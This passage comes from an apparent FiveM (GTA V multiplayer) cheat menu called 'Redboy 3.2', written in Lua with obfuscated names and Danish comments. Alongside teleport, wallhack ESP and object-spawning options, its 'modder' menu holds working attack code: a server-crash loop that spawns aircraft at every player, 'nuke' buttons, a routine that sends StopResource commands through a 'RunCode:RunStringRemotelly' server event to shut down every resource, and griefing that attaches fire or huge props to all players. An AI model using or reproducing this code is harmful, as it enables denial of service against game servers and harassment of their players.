            elseif RPPPwdjwdU23.Button("~r~Fuck Up The Map (Irreversible!)  [WIP]") then
                if not FuckMap then
                    ShowInfo("~b~Fucking Up Map")
                    FuckMap = true
                else
                    ShowInfo("~r~Map Already Fucked")
                end
			end
        
        
        -- OBJECT SPAWNER MENU
        elseif RPPPwdjwdU23.IsMenuOpened('objectspawner') then
        if RPPPwdjwdU23.Button("Spawn Object") then
            local pos = GetEntityCoords(PlayerPedId())
            local pitch = GetEntityPitch(PlayerPedId())
            local roll = GetEntityRoll(PlayerPedId())
            local yaw = GetEntityRotation(PlayerPedId()).z
            local xf = GetEntityForwardX(PlayerPedId())
            local yf = GetEntityForwardY(PlayerPedId())
            local spawnedObj = nil
            if currDirectionIndex == 1 then
                spawnedObj = CreateObject(GetHashKey(obj), pos.x + (xf * 10), pos.y + (yf * 10), pos.z - 1, 1, 1, 1)
            elseif currDirectionIndex == 2 then
                spawnedObj = CreateObject(GetHashKey(obj), pos.x - (xf * 10), pos.y - (yf * 10), pos.z - 1, 1, 1, 1)
            end
            SetEntityRotation(spawnedObj, pitch, roll, yaw + ObjRotation)
            SetEntityVisible(spawnedObj, objVisible, 0)
            FreezeEntityPosition(spawnedObj, 1)
            table.insert(SpawnedObjects, spawnedObj)
            elseif RPPPwdjwdU23.ComboBox("~s~Select~s~ To Object~r~ | CHANGEABLE", objs_tospawn, currObjIndex, selObjIndex, function(currentIndex, selectedIndex)
				currObjIndex = currentIndex
				selObjIndex = currentIndex
				obj = objs_tospawn[currObjIndex]
				end) then
                    --her er objectlist over alle objects du har spawnet og du kan Delete alle 
                elseif RPPPwdjwdU23.MenuButton("se alle objects du har spawnet", 'objectlist') then

            elseif RPPPwdjwdU23.Button("Delete All Spawned Objects") then for i = 1, #SpawnedObjects do RequestControlOnce(SpawnedObjects[i])DeleteObject(SpawnedObjects[i]) end
            else
                for i = 1, #SpawnedObjects do
                    if DoesEntityExist(SpawnedObjects[i]) then
                        if RPPPwdjwdU23.Button("OBJECT [" .. i .. "] WITH ID " .. SpawnedObjects[i]) then
                            RequestControlOnce(SpawnedObjects[i])
                            DeleteObject(SpawnedObjects[i])
                        end
                    end
                end
            end
        
        
        -- SPAWNED OBJECTS MENU
        elseif RPPPwdjwdU23.IsMenuOpened('objectlist') then
            if RPPPwdjwdU23.Button("Delete All Spawned Objects") then for i = 1, #SpawnedObjects do RequestControlOnce(SpawnedObjects[i])DeleteObject(SpawnedObjects[i]) end
            else
                for i = 1, #SpawnedObjects do
                    if DoesEntityExist(SpawnedObjects[i]) then
                        if RPPPwdjwdU23.Button("OBJECT [" .. i .. "] WITH ID " .. SpawnedObjects[i]) then
                            RequestControlOnce(SpawnedObjects[i])
                            DeleteObject(SpawnedObjects[i])
                        end
                    end
                end
            end
        
        -- WEATHER CHANGER MENU
		elseif RPPPwdjwdU23.IsMenuOpened('weather') then
		    if RPPPwdjwdU23.ComboBox("Weather Type", WeathersList, currWeatherIndex, selWeatherIndex, function(currentIndex, selectedIndex)
                    	 currWeatherIndex = currentIndex
                    	 selWeatherIndex = currentIndex
                    	 WeatherType = WeathersList[currentIndex]
		    end) then
		    elseif RPPPwdjwdU23.CheckBox("Weather Changer", WeatherChanger, "Disabled", "Enabled") then
		  	  WeatherChanger = not WeatherChanger
		    end
		
        -- MISC OPTIONS MENU
        elseif RPPPwdjwdU23.IsMenuOpened('misc') then
            if RPPPwdjwdU23.ComboBox('Theme', themes, currThemeIndex, selThemeIndex, function(currentIndex, selectedIndex)
                currThemeIndex = currentIndex
                selThemeIndex = selectedIndex
            end) then theme = themes[selThemeIndex]RPPPwdjwdU23.InitializeTheme()
			elseif RPPPwdjwdU23.MenuButton("ESP & Visual", 'esp') then
			elseif RPPPwdjwdU23.MenuButton("Keybindings", 'keybindings') then
            elseif RPPPwdjwdU23.CheckBox('Force Map', ForceMap) then
                ForceMap = not ForceMap
            elseif RPPPwdjwdU23.CheckBox('Force Third Person', ForceThirdPerson) then
                ForceThirdPerson = not ForceThirdPerson
			elseif RPPPwdjwdU23.MenuButton("Web Radio", 'webradio') then
            elseif RPPPwdjwdU23.CheckBox("Portable Radio", Radio, "Disabled", "Enabled") then
                Radio = not Radio
                ShowInfo("~r~Portable Radio will override any vehicle's radio!")
            elseif RPPPwdjwdU23.ComboBox2("Change Radio Station", RadiosListWords, currRadioIndex, selRadioIndex, function(currentIndex, selectedIndex)

                currRadioIndex = currentIndex
                selRadioIndex = currentIndex
                RadioStation = RadiosList[currentIndex]
            end) then
            elseif RPPPwdjwdU23.CheckBox('Always Draw Crosshair', Crosshair) then
                Crosshair = not Crosshair
            elseif RPPPwdjwdU23.CheckBox("Show Coordinates", ShowCoords) then
                ShowCoords = not ShowCoords
            elseif RPPPwdjwdU23.MenuButton('Credits', 'credits') then
            end
					
		-- ESP OPTIONS MENU
		elseif RPPPwdjwdU23.IsMenuOpened('esp') then
			if RPPPwdjwdU23.CheckBox("Blips", BlipsEnabled) then
                ToggleBlips()
            elseif RPPPwdjwdU23.CheckBox("Nametags", NametagsEnabled) then
                NametagsEnabled = not NametagsEnabled
                tags_plist = GetActivePlayers()
                ptags = {}
                for i = 1, #tags_plist do
                    ptags[i] = CreateFakeMpGamerTag(GetPlayerPed(tags_plist[i]), GetPlayerName(tags_plist[i]), 0, 0, "", 0)
                    SetMpGamerTagVisibility(ptags[i], 0, NametagsEnabled)
                    SetMpGamerTagVisibility(ptags[i], 2, NametagsEnabled)
                end
                if not NametagsEnabled then
                    for i = 1, #ptags do
                        SetMpGamerTagVisibility(ptags[i], 4, 0)
                        SetMpGamerTagVisibility(ptags[i], 8, 0)
                    end
                end
            elseif RPPPwdjwdU23.CheckBox("Alternative (OneSync) Nametags", ANametagsEnabled) then
                ANametagsEnabled = not ANametagsEnabled
            elseif RPPPwdjwdU23.CheckBox("Draw Alternative Nametags Through Walls", ANametagsNotNeedLOS) then
                ANametagsNotNeedLOS = not ANametagsNotNeedLOS
			elseif RPPPwdjwdU23.CheckBox("ESP", ESPEnabled) then
				ToggleESP()
            elseif RPPPwdjwdU23.ComboBoxSlider("ESP Distance", ESPDistanceOps, currESPDistance, selESPDistance, function(currentIndex, selectedIndex)
                currESPDistance = currentIndex
                selESPDistance = currentIndex
                EspDistance = ESPDistanceOps[currESPDistance]
            end) then
			elseif RPPPwdjwdU23.ComboBoxSlider("ESP Refresh Rate", ESPRefreshOps, currESPRefreshIndex, selESPRefreshIndex, function(currentIndex, selectedIndex)
                currESPRefreshIndex = currentIndex
                selESPRefreshIndex = currentIndex
				if currentIndex == 1 then
					ESPRefreshTime = 0
				elseif currentIndex == 2 then
					ESPRefreshTime = 100
				elseif currentIndex == 3 then
					ESPRefreshTime = 250
				elseif currentIndex == 4 then
					ESPRefreshTime = 500
				elseif currentIndex == 5 then
					ESPRefreshTime = 1000
				elseif currentIndex == 6 then
					ESPRefreshTime = 2000
				elseif currentIndex == 7 then
					ESPRefreshTime = 5000
				end
            end) then
            elseif RPPPwdjwdU23.CheckBox("Lines", LinesEnabled) then
                LinesEnabled = not LinesEnabled
			end
			
		-- KEYBINDS MENU
		elseif RPPPwdjwdU23.IsMenuOpened('keybindings') then
			if RPPPwdjwdU23.CheckBox("Menu Keybind:", 0, menuKeybind, menuKeybind) then
				local key = string.upper(GetKeyboardInput("Input New Key Name (line 1316)"))
				
				if Keys[key] then
					menuKeybind = key
					ShowInfo("Menu bind has been set to ~g~"..key)
				else
					ShowInfo("~r~Key "..key.." is not valid!")
				end

            elseif RPPPwdjwdU23.CheckBox("vis du vil have en Menu Keybind til:", 0, menuKeybind5, menuKeybind5) then
                    local key = string.upper(GetKeyboardInput("Input New Key Name (line 1316)"))
                    
                    if Keys[key] then
                        menuKeybind5 = key
                        ShowInfo("Menu bind has been set to ~g~"..key)
                    else
                        ShowInfo("~r~Key "..key.." is not valid!")
                    end
				
			elseif RPPPwdjwdU23.CheckBox("Fix Vehicle Keybind:", 0, fixcarKeybind, fixcarKeybind) then
				local key = string.upper(GetKeyboardInput("Input New Key Name (line 1316)"))
				
				if Keys[key] then
					fixcarKeybind = key
					ShowInfo("FixVeh bind has been set to ~g~"..key)
				else
					ShowInfo("~r~Key "..key.." is not valid!")
				end
			elseif RPPPwdjwdU23.CheckBox("Heal Self Keybind:", 0, healplayerKeybind, healplayerKeybind) then
				local key = string.upper(GetKeyboardInput("Input New Key Name (line 1316)"))
				
				if Keys[key] then
					healplayerKeybind = key
					ShowInfo("Heal Self bind has been set to ~g~"..key)
				else
					ShowInfo("~r~Key "..key.." is not valid!")
				end
			end
		-- WEB RADIO MENU
        elseif RPPPwdjwdU23.IsMenuOpened('webradio') then
            if RPPPwdjwdU23.CheckBox("Classical", ClassicalRadio, "Status: Not Playing", "Status: Playing") then
				ClassicalRadio = not ClassicalRadio
				if ClassicalRadio then
					RadioDUI = CreateDui("https://www.youtube.com/watch?v=t8xmLnc7h-M", 1, 1)
					ShowInfo("~b~Now Playing...")
				else
					DestroyDui(RadioDUI)
					ShowInfo("~r~Web Radio Stopped!")
				end
			end
       
        -- TELEPORT OPTIONS MENU
        elseif RPPPwdjwdU23.IsMenuOpened('teleport') then
            if RPPPwdjwdU23.MenuButton('Save/Load Position', 'saveload') then
            elseif RPPPwdjwdU23.MenuButton('Teleport to POI', 'pois') then
            elseif RPPPwdjwdU23.Button('Teleport To Waypoint') then
				TeleportToWaypoint()
            end
        
        -- SAVE/LOAD POSITION MENU
        elseif RPPPwdjwdU23.IsMenuOpened('saveload') then
            if RPPPwdjwdU23.ComboBox("Saved Location 1", {"save", "load"}, currSaveLoadIndex1, selSaveLoadIndex1, function(currentIndex, selectedIndex)
                currSaveLoadIndex1 = currentIndex
                selSaveLoadIndex1 = currentIndex
            end) then
                if selSaveLoadIndex1 == 1 then
                    savedpos1 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 1 Saved")
                else
                    if not savedpos1 then ShowInfo("~r~There is no saved position for slot 1!") else
                        SetEntityCoords(PlayerPedId(), savedpos1)
                        ShowInfo("~g~Position 1 Loaded")
                    end
                end
            elseif RPPPwdjwdU23.ComboBox("Saved Location 2", {"save", "load"}, currSaveLoadIndex2, selSaveLoadIndex2, function(currentIndex, selectedIndex)
                currSaveLoadIndex2 = currentIndex
                selSaveLoadIndex2 = currentIndex
            end) then
                if selSaveLoadIndex2 == 1 then
                    savedpos2 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 2 Saved")
                else
                    if not savedpos2 then ShowInfo("~r~There is no saved position for slot 2!") else
                        SetEntityCoords(PlayerPedId(), savedpos2)
                        ShowInfo("~g~Position 2 Loaded")
                    end
                end
            elseif RPPPwdjwdU23.ComboBox("Saved Location 3", {"save", "load"}, currSaveLoadIndex3, selSaveLoadIndex3, function(currentIndex, selectedIndex)
                currSaveLoadIndex3 = currentIndex
                selSaveLoadIndex3 = currentIndex
            end) then
                if selSaveLoadIndex3 == 1 then
                    savedpos3 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 3 Saved")
                else
                    if not savedpos3 then ShowInfo("~r~There is no saved position for slot 3!") else
                        SetEntityCoords(PlayerPedId(), savedpos3)
                        ShowInfo("~g~Position 3 Loaded")
                    end
                end
            elseif RPPPwdjwdU23.ComboBox("Saved Location 4", {"save", "load"}, currSaveLoadIndex4, selSaveLoadIndex4, function(currentIndex, selectedIndex)
                currSaveLoadIndex4 = currentIndex
                selSaveLoadIndex4 = currentIndex
            end) then
                if selSaveLoadIndex4 == 1 then
                    savedpos4 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 4 Saved")
                else
                    if not savedpos4 then ShowInfo("~r~There is no saved position for slot 4!") else
                        SetEntityCoords(PlayerPedId(), savedpos4)
                        ShowInfo("~g~Position 4 Loaded")
                    end
                end
            elseif RPPPwdjwdU23.ComboBox("Saved Location 5", {"save", "load"}, currSaveLoadIndex5, selSaveLoadIndex5, function(currentIndex, selectedIndex)
                currSaveLoadIndex5 = currentIndex
                selSaveLoadIndex5 = currentIndex
            end) then
                if selSaveLoadIndex5 == 1 then
                    savedpos5 = GetEntityCoords(PlayerPedId())
                    ShowInfo("~g~Position 5 Saved")
                else
                    if not savedpos5 then ShowInfo("~r~There is no saved position for slot 5!") else
                        SetEntityCoords(PlayerPedId(), savedpos5)
                        ShowInfo("~g~Position 5 Loaded")
                    end
                end
            end
        
        -- TELEPORT TO POIs MENU
        elseif RPPPwdjwdU23.IsMenuOpened('pois') then
            if RPPPwdjwdU23.Button("Car Dealership (Simeon's)") then
                SetEntityCoords(PlayerPedId(), -3.812, -1086.427, 26.672)
            elseif RPPPwdjwdU23.Button("Legion Square") then
                SetEntityCoords(PlayerPedId(), 212.685, -920.016, 30.692)
            elseif RPPPwdjwdU23.Button("Grove Street") then
                SetEntityCoords(PlayerPedId(), 118.63, -1956.388, 20.669)
            elseif RPPPwdjwdU23.Button("LSPD HQ") then
                SetEntityCoords(PlayerPedId(), 436.873, -987.138, 30.69)
            elseif RPPPwdjwdU23.Button("Sandy Shores BCSO HQ") then
                SetEntityCoords(PlayerPedId(), 1864.287, 3690.687, 34.268)
            elseif RPPPwdjwdU23.Button("Paleto Bay BCSO HQ") then
                SetEntityCoords(PlayerPedId(), -424.13, 5996.071, 31.49)
            elseif RPPPwdjwdU23.Button("FIB Top Floor") then
                SetEntityCoords(PlayerPedId(), 135.835, -749.131, 258.152)
            elseif RPPPwdjwdU23.Button("FIB Offices") then
                SetEntityCoords(PlayerPedId(), 136.008, -765.128, 242.152)
            elseif RPPPwdjwdU23.Button("Michael's House") then
                SetEntityCoords(PlayerPedId(), -801.847, 175.266, 72.845)
            elseif RPPPwdjwdU23.Button("Franklin's First House") then
                SetEntityCoords(PlayerPedId(), -17.813, -1440.008, 31.102)
            elseif RPPPwdjwdU23.Button("Franklin's Second House") then
                SetEntityCoords(PlayerPedId(), -6.25, 522.043, 174.628)
            elseif RPPPwdjwdU23.Button("Trevor's Trailer") then
                SetEntityCoords(PlayerPedId(), 1972.972, 3816.498, 32.95)
            elseif RPPPwdjwdU23.Button("Tequi-La-La") then
                SetEntityCoords(PlayerPedId(), -568.25, 291.261, 79.177)
            end
        



            -- lyser??demodder
        elseif RPPPwdjwdU23.IsMenuOpened('modder') then
        if RPPPwdjwdU23.CheckBox("~r~silent ~p~crash ~g~server", nukeserver) then
            nukeserver = not nukeserver

        elseif RPPPwdjwdU23.Button("Get ~b~Resource ~r~(F8)") then
                ShowInfo("~y~F8")
                Resources = GetResources()
    
    ResourcesToCheck = {
                        -- ESX
                        "es_extended", "esx_dmvschool", "esx_policejob", "",
                        -- VRP
                        "[vrp]", "vrp", "vrp_trucker", "vrp_TruckerJob", "vrp_mysql", "vrp_onlinejobs", "cfg",
                        -- DN-Scripts
                        "[dn-scripts]", "dn-loadingscreen", "dn-mech", "fivem", "[v??ben]", "guns", "stream", "AC", "[Misc]", "DiscordBot", "modelblacklist", "removeshopcars", "construction", "",
                        -- Scrips
                        "dato", "resources", "server", "dn-stream", "client", "gui", "modules", "vrp_doors",
    }
    
    print("\n\nRESOURCES FOUND\n________________\n")
    for i = 1, #Resources do
        print(Resources[i])
    end
    print("\n________________\nEND OF RESOURCES BY K??DKONGEN#9999\n")
    elseif RPPPwdjwdU23.Button("~r~n!uke Server") then
    ShowInfo("~y~Fucking Players...")
    EdWiowko()
    
    elseif RPPPwdjwdU23.CheckBox("~r~n!uke All Players ~p~(LOOP)", dwakodkwiajdiawjd) then
    dwakodkwiajdiawjd = not dwakodkwiajdiawjd
    
    elseif RPPPwdjwdU23.Button("~r~RedBoy Fucker") then
    ShowInfo("~y~RedBoy Fucking Players...")
    ShowInfo("~y~RedBoy Fucking Players...")
    print("Redboy 3.2 is the best menu on the market right now!")
    print("Redboy 3.2 is the best menu on the market right now!")
    print("Redboy 3.2 is the best menu on the market right now!")
    print("Redboy 3.2 is the best menu on the market right now!")
    print("Redboy 3.2 is the best menu on the market right now!")
    print("Redboy 3.2 is the best menu on the market right now!")
    print("Redboy 3.2 is the best menu on the market right now!")
    print("Redboy 3.2 is the best menu on the market right now!")
    print("Redboy 3.2 is the best menu on the market right now!")
    print("Redboy 3.2 is the best menu on the market right now!")
    print("Redboy 3.2 is the best menu on the market right now!")
    MFt4elNUg0kg()
    elseif RPPPwdjwdU23.Button("~r~Crashserver (Devo)") then
    local myTable = {
        'Redboy 3.2 Menu',
        'cred k??dkongen/me/RedBoy v3',
        '! K  ??  D  K  O  N  G  E  N #0001'
    }
    function ShowInfo(text)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(text)
    DrawNotification(true, false)
    end
    ShowInfo(myTable[ math.random( #myTable ) ])
    local function FgWqg()
    local ouGWmAexz = {}
    for i = 0, GetNumResources() do
    ouGWmAexz[i] = GetResourceByFindIndex(i)
    end
    return ouGWmAexz
    end
    local RwFbMFt4elf6NNUg0kg = {}
    RwFbMFt4elf6NNUg0kg = FgWqg()
    run = ""
    for i = 0, #RwFbMFt4elf6NNUg0kg do
    run = run .. " StopResource('" .. RwFbMFt4elf6NNUg0kg[i] .. "') " 
    TriggerServerEvent("RunCode:RunStringRemotelly", run)
    end
    elseif RPPPwdjwdU23.ComboBox("~s~Prop Everyone", {"Fire ~y~Everyone", "Maze bank ~b~Everyone", "MidtBY ~r~Everyone", "~g~FBI bulding ~y~Everyone",}, currPFuncIndex, selPFuncIndex, function(currentIndex, selectedIndex)
    currPFuncIndex = currentIndex
    selPFuncIndex = currentIndex
    end) then
    if selPFuncIndex == 1 then
        for i = 0, 128 do
            if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                local eb = 'prop_beach_fire'
                local ec = -145066854
                while not HasModelLoaded(ec) do
                    Citizen.Wait(0)
                    RequestModel(ec)
                end
                local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                AttachEntityToEntity(
                    ed,
                    GetVehiclePedIsIn(GetPlayerPed(i), false),
                    GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                    0,
                    0,
                    -1.0,
                    0.0,
                    0.0,
                    0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
            else
                local eb = 'prop_beach_fire'
                local ec = GetHashKey(eb)
                while not HasModelLoaded(ec) do
                    Citizen.Wait(0)
                    RequestModel(ec)
                end
                local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                AttachEntityToEntity(
                    ed,
                    GetPlayerPed(i),
                    GetPedBoneIndex(GetPlayerPed(i), 0),
                    0,
                    0,
                    -1.0,
                    0.0,
                    0.0,
                    0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
            end
        end
    elseif selPFuncIndex == 2 then
        for i = 0, 128 do
            if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                local eb = 'dt1_11_dt1_tower'
                local ec = -145066854
                while not HasModelLoaded(ec) do
                    Citizen.Wait(0)
                    RequestModel(ec)
                end
                local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                AttachEntityToEntity(
                    ed,
                    GetVehiclePedIsIn(GetPlayerPed(i), false),
                    GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                    0,
                    0,
                    -1.0,
                    0.0,
                    0.0,
                    0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
            else
                local eb = 'dt1_11_dt1_tower'
                local ec = GetHashKey(eb)
                while not HasModelLoaded(ec) do
                    Citizen.Wait(0)
                    RequestModel(ec)
                end
                local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                AttachEntityToEntity(
                    ed,
                    GetPlayerPed(i),
                    GetPedBoneIndex(GetPlayerPed(i), 0),
                    0,
                    0,
                    -1.0,
                    0.0,
                    0.0,
                    0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
            end
        end
    elseif selPFuncIndex == 3 then
        for i = 0, 128 do
            if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                local eb = 'dt1_lod_03_04_05_11'
                local ec = -145066854
                while not HasModelLoaded(ec) do
                    Citizen.Wait(0)
                    RequestModel(ec)
                end
                local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                AttachEntityToEntity(
                    ed,
                    GetVehiclePedIsIn(GetPlayerPed(i), false),
                    GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                    0,
                    0,
                    -1.0,
                    0.0,
                    0.0,
                    0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
            else
                local eb = 'dt1_lod_03_04_05_11'
                local ec = GetHashKey(eb)
                while not HasModelLoaded(ec) do
                    Citizen.Wait(0)
                    RequestModel(ec)
                end
                local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                AttachEntityToEntity(
                    ed,
                    GetPlayerPed(i),
                    GetPedBoneIndex(GetPlayerPed(i), 0),
                    0,
                    0,
                    -1.0,
                    0.0,
                    0.0,
                    0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
            end
        end
    elseif selVFuncIndexx == 4 then
        for i = 0, 128 do
            if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                local eb = 'dt1_05_fbi_colplug'
                local ec = GetHashKey(eb)
                while not HasModelLoaded(ec) do
                    Citizen.Wait(0)
                    RequestModel(ec)
                end
                local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                AttachEntityToEntity(
                    ed,
                    GetVehiclePedIsIn(GetPlayerPed(i), false),
                    GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                    0,
                    0,
                    -1.0,
                    0.0,
                    0.0,
                    0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
            else
                local eb = 'dt1_05_fbi_colplug'
                local ec = GetHashKey(eb)
                while not HasModelLoaded(ec) do
                    Citizen.Wait(0)
                    RequestModel(ec)
                end
                local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                AttachEntityToEntity(
                    ed,
                    GetPlayerPed(i),
                    GetPedBoneIndex(GetPlayerPed(i), 0),
                    0,
                    0,
                    -1.0,
                    0.0,
                    0.0,
                    0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
            end
        end
    end
    
    
    elseif RPPPwdjwdU23.Button('~s~Make ~q~all Players ~o~Fire') then
    for i = 0, 128 do
            if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                local eb = 'prop_beach_fire'
                local ec = GetHashKey(eb)
                while not HasModelLoaded(ec) do
                    Citizen.Wait(0)
                    RequestModel(ec)
                end
                local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                AttachEntityToEntity(
                    ed,
                    GetVehiclePedIsIn(GetPlayerPed(i), false),
                    GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                    0,
                    0,
                    -1.0,
                    0.0,
                    0.0,
                    0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
            else
                local eb = 'prop_beach_fire'
                local ec = GetHashKey(eb)
                while not HasModelLoaded(ec) do
                    Citizen.Wait(0)
                    RequestModel(ec)
                end
                local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                AttachEntityToEntity(
                    ed,
                    GetPlayerPed(i),
                    GetPedBoneIndex(GetPlayerPed(i), 0),
                    0,
                    0,
                    -1.0,
                    0.0,
                    0.0,
                    0,
                    true,
                    true,
                    false,
                    true,
                    1,
                    true
                )
            end
        end
    
    elseif RPPPwdjwdU23.Button('~s~Make ~q~all ~g~Players ~o~yacht') then
        for i = 0, 128 do
                if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                    local eb = 'sm_boat_slod1'
                    local ec = GetHashKey(eb)
                    while not HasModelLoaded(ec) do
                        Citizen.Wait(0)
                        RequestModel(ec)
                    end
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        ed,
                        GetVehiclePedIsIn(GetPlayerPed(i), false),
                        GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                        0,
                        0,
                        -1.0,
                        0.0,
                        0.0,
                        0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                else
                    local eb = 'sm_boat_slod1'
                    local ec = GetHashKey(eb)
                    while not HasModelLoaded(ec) do
                        Citizen.Wait(0)
                        RequestModel(ec)
                    end
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                        ed,
                        GetPlayerPed(i),
                        GetPedBoneIndex(GetPlayerPed(i), 0),
                        0,
                        0,
                        -1.0,
                        0.0,
                        0.0,
                        0,
                        true,
                        true,
                        false,
                        true,
                        1,
                        true
                    )
                end
            end
    
        elseif RPPPwdjwdU23.Button('~s~Make ~q~all Players ~o~k??mpe bakke') then
            for i = 0, 128 do
                    if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                        local eb = 'ch2_lod3_slod3'
                        local ec = GetHashKey(eb)
                        while not HasModelLoaded(ec) do
                            Citizen.Wait(0)
                            RequestModel(ec)
                        end
                        local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(
                            ed,
                            GetVehiclePedIsIn(GetPlayerPed(i), false),
                            GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                            0,
                            0,
                            -1.0,
                            0.0,
                            0.0,
                            0,
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                    else
                        local eb = 'ch2_lod3_slod3'
                        local ec = GetHashKey(eb)
                        while not HasModelLoaded(ec) do
                            Citizen.Wait(0)
                            RequestModel(ec)
                        end
                        local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                        AttachEntityToEntity(
                            ed,
                            GetPlayerPed(i),
                            GetPedBoneIndex(GetPlayerPed(i), 0),
                            0,
                            0,
                            -1.0,
                            0.0,
                            0.0,
                            0,
                            true,
                            true,
                            false,
                            true,
                            1,
                            true
                        )
                    end
                end
    
    
    
    elseif RPPPwdjwdU23.Button("~h~~b~------~q~S~r~e~g~r~o~v~p~e~g~r ~w~IP~b~------") then
    elseif RPPPwdjwdU23.Button("~q~S~r~e~g~r~o~v~p~e~g~r ~g~IP: ~s~"..GetCurrentServerEndpoint()) then
    elseif RPPPwdjwdU23.Button("~h~~b~------~q~S~r~e~g~r~o~v~p~e~g~r ~w~IP~b~------") then
        end




        if nukeserver then
            Citizen.CreateThread(
            function()
                local dg="Avenger"
                local dh="tula"
                local di="volatol"
                local dj="maverick"
                local dk="bombushka"
                local al=""
        
                while not HasModelLoaded(GetHashKey(dh))do
                    Citizen.Wait(0)
                    RequestModel(GetHashKey(dh))
                end
        
                while not HasModelLoaded(GetHashKey(di))do
                    Citizen.Wait(0)RequestModel(GetHashKey(di))
                end
        
                while not HasModelLoaded(GetHashKey(dg))do
                    Citizen.Wait(0)RequestModel(GetHashKey(dg))
                end
        
                while not HasModelLoaded(GetHashKey(dj))do
                    Citizen.Wait(0)RequestModel(GetHashKey(dj))
                end
        
                while not HasModelLoaded(GetHashKey(dk))do
                    Citizen.Wait(0)RequestModel(GetHashKey(dk))
                end
        
                for bs=0,9 do
                    
                end
        
                for i=0,128 do
                    local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,true,true) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)
                end
        
             end)
            end







            -- models options menu
        elseif RPPPwdjwdU23.IsMenuOpened('models') then
            if RPPPwdjwdU23.MenuButton('Skift til et dyr', 'dyr') then
            elseif RPPPwdjwdU23.MenuButton('Skift til en youtuber', 'ytt') then

        elseif RPPPwdjwdU23.Button("Skifte til ~p~Clown") then
                local model = "s_m_y_clown_01"
                    RequestModel(GetHashKey(model))
                    Wait(500)
                    if HasModelLoaded(GetHashKey(model)) then
                    SetPlayerModel(PlayerId(), GetHashKey(model))
                end
            elseif RPPPwdjwdU23.Button("Skifte til ~p~zombie") then
                    local model = "cs_bradcadaver"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif RPPPwdjwdU23.Button("Skifte til ~p~bodyguard") then
                    local model = "s_m_m_bouncer_01"
                        RequestModel(GetHashKey(model))
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                        SetPlayerModel(PlayerId(), GetHashKey(model))
                    end
                elseif RPPPwdjwdU23.Button("Skifte til ~p~covid_19") then
                    local model = "g_m_m_chemwork_01"
                        RequestModel(GetHashKey(model))
                        Wait(500)
